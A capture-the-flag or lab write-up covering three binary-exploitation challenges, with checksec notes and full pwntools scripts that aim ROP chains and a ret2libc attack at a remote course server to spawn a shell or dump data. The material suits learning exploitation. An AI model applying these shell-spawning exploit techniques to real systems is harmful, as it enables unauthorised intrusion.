## chonk

* always checksec first
		
	```
	Arch:       amd64-64-little
	RELRO:      Partial RELRO
	Stack:      Canary found
	NX:         NX enabled -> cant inject shellcode
	PIE:        No PIE (0x400000) -> fixed addr
	SHSTK:      Enabled
	IBT:        Enabled
	Stripped:   No
	```
* ldd chonk: not a dynamic executable -> cant get addr from libc, therefore cant `Using system("/bin/sh") from libc`
*  the alternative way is using Syscall to `execve("/bin/sh", NULL, NULL)`

	* find "bin/sh" addr
		*  strings -a -t x chonk | grep "/bin/sh"
		* since the above step return the null, need to `hardcode the addr in ROP chain`
		* find a writable addr -> `readelf -S chonk | grep '\.bss\|\.data' `-> get addr of `.data`
		
			```
			readelf -S chonk | grep '\.bss\|\.data'
		  [18] .data.rel.ro      PROGBITS         00000000004a5f80  000a4f80
		  [21] .data             PROGBITS         00000000004aa0c0  000a90c0
		  [22] .bss              NOBITS           00000000004abac0  000aaac0
			```
	* ROP chain

		```
		# Constructing the ROP chain
		rop_chain = [
		    # Write "/bin/sh" to writable_addr
		    pop_rax_ret, bin_sh,               # Set rax = "/bin/sh\x00"
		    pop_rsi_ret, writable_addr,        # Set rsi = writable_addr
		    mov_rsi_rax_ret,                   # Write rax to [rsi] (writable_addr)
		
		    # Set up execve syscall
		    pop_rax_ret, execve_syscall_num,   # Set rax = 59 (execve syscall number)
		    pop_rdi_ret, writable_addr,        # Set rdi = writable_addr ("/bin/sh")
		    pop_rsi_ret, 0,                    # Set rsi = 0 (NULL for arguments)
		    syscall_ret                        # Trigger the syscall;
		]
		```
		
* script

	```
	from pwn import *
	
	context.arch = 'amd64'
	if args.REMOTE:
	    p = remote('6447.lol', 7001)
	elif args.HOST:
	    p = process('./chonk')
	else:
	    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
	    p = gdb.debug('./chonk',
	                  gdbscript='''
	                      b *be_exploited
	                      c
	                      ''')
	
	# Define addresses for gadgets and `.bss` writable section
	writable_addr = 0x4abac0               # Start of .bss section
	pop_rax_ret = 0x00000000004213eb       # Address of `pop rax; ret`
	pop_rsi_ret = 0x0000000000477e3d       # Address of `pop rsi; ret`
	mov_rsi_rax_ret = 0x00000000004207c5   # Address of `mov qword ptr [rsi], rax; ret`
	pop_rdi_ret = 0x00000000004788b3       # Address of `pop rdi; ret`
	syscall_ret = 0x000000000040b9f6       # Address of `syscall; ret`
	
	# Execve syscall number for Linux x86-64
	execve_syscall_num = 59
	
	# Full 64-bit string for "/bin/sh"
	bin_sh = 0x0068732f6e69622f  # "/bin/sh\x00" as a single 64-bit value
	
	# Constructing the ROP chain
	rop_chain = [
	    # Write "/bin/sh" to writable_addr
	    pop_rax_ret, bin_sh,               # Set rax = "/bin/sh\x00"
	    pop_rsi_ret, writable_addr,        # Set rsi = writable_addr
	    mov_rsi_rax_ret,                   # Write rax to [rsi] (writable_addr)
	
	    # Set up execve syscall
	    pop_rax_ret, execve_syscall_num,   # Set rax = 59 (execve syscall number)
	    pop_rdi_ret, writable_addr,        # Set rdi = writable_addr ("/bin/sh")
	    pop_rsi_ret, 0,                    # Set rsi = 0 (NULL for arguments)
	    syscall_ret                        # Trigger the syscall; rdx is implicitly 0
	]
	
	# Convert the ROP chain to a payload
	rop_chain_bytes = b''.join(addr.to_bytes(8, 'little') for addr in rop_chain)
	
	# Construct the full payload
	padding = cyclic(16)                   # Adjust padding if needed for overflow
	payload = padding + rop_chain_bytes
	
	# Send the payload to the program
	p.sendlineafter(b'...', payload)
	
	# Interact with the program after exploitation
	p.interactive()
	
	```
	
## retlibc

* always checksec first

	```
	Arch:       amd64-64-little
	RELRO:      Full RELRO
	Stack:      No canary found
	NX:         NX enabled
	PIE:        PIE enabled
	SHSTK:      Enabled
	IBT:        Enabled
	Stripped:   No
	```

* `ldd ret2libc` got the libc addr which is `libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff972b6b000)

* ROP chain -> pop a shell using libc gadgets since there is no useful gadgets in binary
* works well in local machine but not remote server
* brute force libc version: by given `setbuf` addr, put into [libc.rip](libc.rip) and download all possible libcs, try to match the remote server

	```
	libc = ELF('./libc_version')
	```


* script

	```
	from pwn import *
	
	context.arch = 'amd64'
	if args.REMOTE:
	    p = remote('6447.lol', 7002)
	elif args.HOST:
	    p = process('./ret2libc')
	else:
	    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
	    p = gdb.debug('./ret2libc',
	                  gdbscript='''
	                      b *joke
	                      c
	                      ''')
	                      
	libc = ELF('./libc6_2.39-0ubuntu8.2_amd64.so')
	# libc = ELF('./libc-2.18-9.2.mga4.x86_64.so')
	rop = ROP(libc)
	# Known addresses and offsets
	output = p.recvuntil(b'- ')
	address_part = p.recvuntil(b' -').strip().decode()
	address_part = address_part.replace(' -', '')
	setbuf_addr = int(address_part, 16)
	
	# Offsets for libc functions and strings
	setbuf_offset = libc.symbols['setbuf']  # Offset for setbuf in libc (assuming setbuf is printed)
	system_offset = libc.symbols['system']  # Offset for system in libc
	bin_sh_offset = next(libc.search(b'/bin/sh'))  # Offset of /bin/sh string in libc
	
	
	
	# Find the address of 'pop rdi; ret'
	pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
	ret_gadget_offset = rop.find_gadget(['ret'])[0]   #: nop; ret;
	# Calculate libc base and derived addresses
	libc_base = setbuf_addr - setbuf_offset
	system_addr = libc_base + system_offset
	bin_sh_addr = libc_base + bin_sh_offset
	pop_rdi_ret = libc_base + pop_rdi_ret_offset
	ret_gadget = libc_base + ret_gadget_offset
	
	
	print('setbuf:', hex(setbuf_addr))
	print('libc_base:', hex(libc_base))
	print('system:', hex(system_addr))
	print('bin_sh_addr:', hex(bin_sh_addr))
	print('pop_rdi_ret:', hex(pop_rdi_ret))
	
	# Construct the payload
	payload = cyclic(0x4d0, alphabet=string.ascii_uppercase, n=8).encode()
	payload += cyclic(0x8, alphabet=string.ascii_uppercase, n=8).encode()
	
	payload += p64(pop_rdi_ret)              # Place /bin/sh address into rdi
	payload += p64(bin_sh_addr)              # /bin/sh string address
	payload += p64(ret_gadget) # ret gadget to adjust stack alignment
	payload += p64(system_addr)              # Call system
	
	# Send the payload
	# p.sendlineafter(b'?', payload)
	p.sendline(payload)
	p.interactive()
	
	```
	
	
## roporshellcode
* checksec first: PIE disabled 
* cant use libc gadgets since there is no possible ways to leak the addr of libc base addr
* check `readelf -s roporshellcode` no read/write func can be exploited
* build shellcode 

	```
	MOV RDX, 200
	XOR RAX, RAX
	MOV RDI, 3
	MOV RSI, RSP
	SYSCALL
	
	MOV RAX, 1;
	MOV RDI, 1;
	MOV RDX, 200
	MOV RSI, RSP
	SYSCALL
	```
	
* search useful gadgets from binary 

* script 

	```
	from pwn import *

	context.arch = 'amd64'
	elf = ELF('./roporshellcode')  # Load the target binary
	
	# Set up remote or local debugging environment
	if args.R:
	    p = remote('6447.lol', 7003)
	elif args.H:
	    p = process('./roporshellcode')
	else:
	    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
	    p = gdb.debug('./roporshellcode',
	                  gdbscript='''
	                      b *main
	                      c
	                      ''')
	
	xor_rdx = 0x00000000004011bf  # xor rdx, rdx; ret
	inc_rdx = 0x00000000004011cf  # add rdx, 1; ret
	mov_rax_rdi_from_rdx = 0x00000000004011d4  # mov rax, rdx; mov rdi, rdx; ret
	inc_rdi = 0x00000000004011db  # inc rdi; ret
	syscall = 0x00000000004011c3  # syscall; ret
	
	
	# Construct the ROP chain
	rop_chain = []
	# Read
	# XOR RAX RAX
	rop_chain.append(xor_rdx)
	rop_chain.append(mov_rax_rdi_from_rdx)  # Move RDX (0) to RAX and RDI
	
	# MOV RDI, 3
	rop_chain += [inc_rdi] * 3  # Increment RDI to 3
	
	# MOV RDX, 100
	# rop_chain.append(xor_rdx)  # Clear RDX
	rop_chain += [inc_rdx] * 100  # Increment RDX to 100c
	
	# SYSCALL
	rop_chain.append(syscall)
	
	# Write
	# MOV RAX, 1;MOV RDI,1
	rop_chain.append(xor_rdx)  # Clear RDX
	rop_chain.append(inc_rdx)  # Move RDX (0) to RAX
	rop_chain.append(mov_rax_rdi_from_rdx)  # Set RAX to 1 (write syscall)
	
	# MOV RDX, 100
	rop_chain += [inc_rdx] * 99  # Increment RDX to 100
	
	# SYSCALL
	rop_chain.append(syscall)  # Trigger the syscall to write (write(1, rsp, 200))
	
	# Construct the final payload
	payload = b"A" * 16
	payload += b"".join(p64(r) for r in rop_chain)
	
	# Send the payload and interact
	p.sendline(payload)
	p.interactive()

	
	```